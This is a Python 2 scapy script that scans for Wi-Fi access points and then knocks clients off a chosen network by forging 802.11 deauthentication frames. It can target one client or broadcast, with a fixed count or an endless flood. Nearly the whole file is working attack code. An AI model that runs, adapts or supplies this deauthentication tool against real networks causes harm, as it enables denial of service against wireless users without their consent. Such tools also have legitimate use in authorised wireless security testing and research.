import argparse
import os as os
from scapy.all import *


def parse_args():
    parser = argparse.ArgumentParser()
    subparsers = parser.add_subparsers()


    scanParser = subparsers.add_parser('scan')
    scanParser.add_argument("-i",
                            "--interface",
                            required=True,
                            help="Wireless interface to use (interface must be in monitor mode)."
                            )
    scanParser.set_defaults(func=scan)

    kickParser = subparsers.add_parser('kick')
    kickParser.add_argument("-i",
                            "--interface",
                            required=True,
                            help="Wireless interface to use (interface must be in monitor mode)."
                            )
    kickParser.add_argument("-b",
                            "--bssid",
                            required=True,
                            help="BSSID of target AP."
                            )
    kickParser.add_argument("-c",
                            "--client",
                            default="FF:FF:FF:FF:FF:FF",
                            help="MAC address of the client to kick of the AP (default FF:FF:FF:FF:FF:FF)."
                            )
    group = kickParser.add_mutually_exclusive_group()
    group.add_argument("--count",
                        default=1,
                        type=int,
                        help="Number of Deauth packets to send."
                        )

    group.add_argument("--flood",
                        action="store_true",
                        help="Flood Deauth packets."
                        )
    kickParser.set_defaults(func=kick)

    return parser.parse_args()


###################################
#       SCANNER
###################################

APList = []
clientList = []

def scan(args):
    scanAll(args.interface)

def scanAllFilter(packet):
    if packet.haslayer(Dot11):
        # Beacon frame
        if packet.type == 0 and packet.subtype == 8:
            if packet.addr2.upper() not in APList:
                APList.append(packet.addr2.upper())
                print "BSSID: %s \t ESSID: %s" %(packet.addr2.upper(), packet.info)

def scanAll(interface):
    # Sniffer original code: https://gist.github.com/securitytube/5291959/raw/ce8f39bdd1c882a5f5c1a71eaaf4a19ec8ac1087/ssid-sniffer-scapy-python.py
    sniff(iface=interface, prn=scanAllFilter)

###################################
#       KICKER
###################################

def kick(args):
    if args.count <= 0:
        args.count = 1

    if args.flood:
        while 1:
            sendDeauth()
    else:
       for i in range(0, args.count):
            sendDeauth()

def sendDeauth():
    # Type=0 -> Management frame
    # Subtype 12 -> Deauth management frame
    sendp(RadioTap()/Dot11(type=0, subtype=12, addr1=args.client, addr2=args.bssid, addr3=args.bssid)/Dot11Deauth(reason=7))


if  __name__ == "__main__":
    if os.geteuid() != 0:
        exit("You need to have root privileges to run this script.")

    args = parse_args()
    args.func(args)

